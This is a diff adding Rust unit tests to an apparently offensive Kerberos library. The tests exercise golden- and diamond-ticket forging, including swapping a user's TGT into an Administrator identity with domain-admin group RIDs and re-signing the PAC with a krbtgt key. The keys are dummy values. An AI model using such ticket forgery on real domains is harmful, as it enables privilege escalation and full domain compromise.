@@ -20,6 +20,7 @@ fn sample() -> ForgeIdentity {
         domain_subauths: vec![21, 1111111111, 2222222222, 3333333333],
         logon_server: "DC01".into(),
         logon_domain: "CORP".into(),
+        extra_sids: vec![],
     }
 }
 
@@ -109,6 +110,7 @@ fn forge_identity_survives_roundtrip() {
         domain_subauths: vec![21, 111, 222, 333],
         logon_server: "DC02".into(),
         logon_domain: "LAB".into(),
+        extra_sids: vec![],
     };
     let tgt = forge_golden_tgt(&id, "LAB.LOCAL", &key, false).unwrap();
     let (_etp, pac) = decrypt_ticket_pac_aes256(tgt.ticket_cipher(), &key).unwrap();
@@ -118,4 +120,102 @@ fn forge_identity_survives_roundtrip() {
     assert_eq!(u32::from_le_bytes(li[124..128].try_into().unwrap()), 513);
     // Session key length reflects the etype (32 bytes for AES256).
     assert_eq!(tgt.session_key().len(), 32);
+}
+
+/// Diamond ticket AES256 round-trip: forge a "real" TGT for `alice` (RID 1234,
+/// domain user), then run `forge_diamond_tgt` to identity-swap it into `admin`
+/// (RID 500, DA-shaped groups). Verify the resulting ticket:
+///  * decrypts under the same krbtgt key (proves the re-encryption is honest),
+///  * parses as a valid PAC (proves the PAC swap kept the auth-data envelope
+///    correctly-wrapped),
+///  * carries the new identity's RID + primary GID in LOGON_INFO,
+///  * has both PAC signatures present and re-signed under the same key.
+#[test]
+fn diamond_ticket_aes256_identity_swap() {
+    use ms_pac_forge::forge_diamond_tgt;
+    let krbtgt = [0xa5u8; 32];
+    let alice = ForgeIdentity {
+        user: "alice".into(),
+        rid: 1234,
+        primary_gid: 513,
+        group_rids: vec![513],
+        domain_subauths: vec![21, 111, 222, 333],
+        logon_server: "DC01".into(),
+        logon_domain: "LAB".into(),
+        extra_sids: vec![],
+    };
+    let admin = ForgeIdentity {
+        user: "Administrator".into(),
+        rid: 500,
+        primary_gid: 513,
+        group_rids: vec![513, 512, 520, 518, 519],
+        domain_subauths: alice.domain_subauths.clone(),
+        logon_server: alice.logon_server.clone(),
+        logon_domain: alice.logon_domain.clone(),
+        extra_sids: vec![],
+    };
+
+    let real = forge_golden_tgt(&alice, "LAB.LOCAL", &krbtgt, false).unwrap();
+    let diamond =
+        forge_diamond_tgt(real.ticket_cipher(), &krbtgt, &admin, "LAB.LOCAL", false).unwrap();
+
+    let (_etp, new_pac) =
+        decrypt_ticket_pac_aes256(diamond.ticket_cipher(), &krbtgt).expect("diamond decrypt");
+    let parsed = parse_pac(&new_pac).unwrap();
+
+    let li = &parsed.get(PAC_LOGON_INFO).unwrap().data;
+    assert_eq!(
+        u32::from_le_bytes(li[120..124].try_into().unwrap()),
+        500,
+        "diamond swap must overwrite RID"
+    );
+    assert_eq!(
+        u32::from_le_bytes(li[124..128].try_into().unwrap()),
+        513,
+        "diamond swap must overwrite primary GID"
+    );
+    assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
+    assert!(parsed.get(PAC_KDC_CHECKSUM).is_some());
+
+    // cname on the wire ticket must reflect the new identity, not the old one.
+    assert_eq!(diamond.cname().name_string[0], "Administrator");
+}
+
+/// Diamond RC4 round-trip: same shape as the AES version but on etype 23.
+#[test]
+fn diamond_ticket_rc4_identity_swap() {
+    use ms_pac_forge::checksum::nt_hash;
+    use ms_pac_forge::forge_diamond_tgt;
+    let nt = nt_hash("Krbtgt-NT-Hash!");
+    let victim = sample();
+    let mut new_id = victim.clone_shape();
+    new_id.rid = 4242;
+
+    let real = forge_golden_tgt(&victim, "CORP.LOCAL", &nt, true).unwrap();
+    let diamond =
+        forge_diamond_tgt(real.ticket_cipher(), &nt, &new_id, "CORP.LOCAL", true).unwrap();
+    let (_etp, pac) = decrypt_ticket_pac_rc4(diamond.ticket_cipher(), &nt).unwrap();
+    let parsed = parse_pac(&pac).unwrap();
+    let li = &parsed.get(PAC_LOGON_INFO).unwrap().data;
+    assert_eq!(u32::from_le_bytes(li[120..124].try_into().unwrap()), 4242);
+    // RC4 session key is 16 bytes.
+    assert_eq!(diamond.session_key().len(), 16);
+}
+
+trait CloneShape {
+    fn clone_shape(&self) -> Self;
+}
+impl CloneShape for ForgeIdentity {
+    fn clone_shape(&self) -> Self {
+        ForgeIdentity {
+            user: self.user.clone(),
+            rid: self.rid,
+            primary_gid: self.primary_gid,
+            group_rids: self.group_rids.clone(),
+            domain_subauths: self.domain_subauths.clone(),
+            logon_server: self.logon_server.clone(),
+            logon_domain: self.logon_domain.clone(),
+            extra_sids: self.extra_sids.clone(),
+        }
+    }
 }
